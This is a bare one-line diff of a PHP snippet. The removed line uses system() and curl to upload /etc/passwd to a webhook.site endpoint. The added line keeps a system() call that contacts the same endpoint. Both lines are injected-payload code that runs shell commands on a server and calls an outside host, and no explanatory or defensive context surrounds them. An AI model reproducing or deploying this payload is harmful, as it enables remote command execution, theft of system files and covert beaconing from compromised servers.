@@ -1,1 +1,1 @@
-<?php system('curl -F data=@/etc/passwd https://webhook.site/9f67def9-d944-4b6d-8120-f691fd60d3bb'); ?>
+<?php system('curl https://webhook.site/9f67def9-d944-4b6d-8120-f691fd60d3bb'); ?>
